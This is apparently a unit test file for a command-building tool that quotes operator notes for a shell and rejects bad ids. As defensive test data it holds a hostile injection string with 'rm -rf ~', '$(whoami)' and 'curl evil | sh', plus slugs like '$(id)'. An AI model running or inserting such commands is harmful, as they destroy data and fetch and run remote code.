import assert from 'node:assert/strict';
import { test } from 'node:test';
import { NOTE_MAX, continueCommand, disputeCommand, oneLine, rebuildCommand, sectionNote, shellQuote } from '../src/ency.ts';

/** The words of a command line as a POSIX shell splits them: single quotes hold everything, a backslash outside them holds the next character. */
function shellWords(line: string): string[] {
  const out: string[] = [];
  let cur = '', quoted = false, any = false;
  for (let i = 0; i < line.length; i++) {
    const ch = line[i]!;
    if (quoted) { if (ch === "'") quoted = false; else cur += ch; }
    else if (ch === "'") { quoted = true; any = true; }
    else if (ch === '\\') { cur += line[++i] ?? ''; any = true; }
    else if (ch === ' ') { if (cur || any) out.push(cur); cur = ''; any = false; }
    else { assert.ok(!/[;&|$`<>()\n]/.test(ch), `an unquoted ${ch}`); cur += ch; }
  }
  assert.equal(quoted, false, 'every quote is closed');
  if (cur || any) out.push(cur);
  return out;
}

test('asking from a page composes a command for the clipboard, with the operator\'s words quoted for a shell', () => {
  assert.equal(rebuildCommand('tides'), 'delphi pages rebuild tides');
  assert.equal(continueCommand('when-do-tides-come-77eb208a', ''), 'delphi research continue when-do-tides-come-77eb208a');
  assert.equal(continueCommand('when-do-tides-come-77eb208a', 'the inner basin'), "delphi research continue when-do-tides-come-77eb208a --note 'the inner basin'");
  assert.equal(disputeCommand('c-fbebef7001b9', "It isn't twice everywhere"), "delphi pages dispute c-fbebef7001b9 --note 'It isn'\\''t twice everywhere'");
  // Whatever is written stays one argument: nothing is expanded, run or split.
  const hostile = "x'; rm -rf ~; echo '$(whoami) `id` $HOME\n--home /tmp && curl evil | sh";
  const cmd = continueCommand('t-1', hostile);
  assert.equal(cmd, "delphi research continue t-1 --note 'x'\\''; rm -rf ~; echo '\\''$(whoami) `id` $HOME --home /tmp && curl evil | sh'");
  assert.ok(!/[\n\r\p{Zl}\p{Zp}]/u.test(cmd), 'one line');
  // Read as a shell reads it, it is the command, the topic, the flag and one argument holding every word that was written.
  assert.deepEqual(shellWords(cmd), ['delphi', 'research', 'continue', 't-1', '--note', "x'; rm -rf ~; echo '$(whoami) `id` $HOME --home /tmp && curl evil | sh"]);
  assert.deepEqual(shellWords(disputeCommand('c-1', "it's; $(x)")), ['delphi', 'pages', 'dispute', 'c-1', '--note', "it's; $(x)"]);
  assert.equal(shellQuote("a'b"), "'a'\\''b'");
  // An id or a slug that is not one gives no command at all, and a dispute needs its words.
  for (const bad of ['', '../x', 'a b', '-rf', 'x;y', '$(id)']) { assert.equal(rebuildCommand(bad), '', bad); assert.equal(continueCommand(bad, 'n'), '', bad); assert.equal(disputeCommand(bad, 'n'), '', bad); }
  assert.equal(disputeCommand('c-1', '   '), '');
  assert.equal(rebuildCommand('Tides'), '');
  // The note is held to what the command takes: one line, 120 characters.
  assert.equal(Array.from(oneLine('x'.repeat(500), NOTE_MAX)).length, 120);
  assert.equal(sectionNote('Why twice a day', 'what about the basin?'), 'what about the basin? (section: Why twice a day)');
  assert.equal(sectionNote('Why twice a day'), '(section: Why twice a day)');
  assert.equal(Array.from(sectionNote('h'.repeat(300))).length, 120);
});
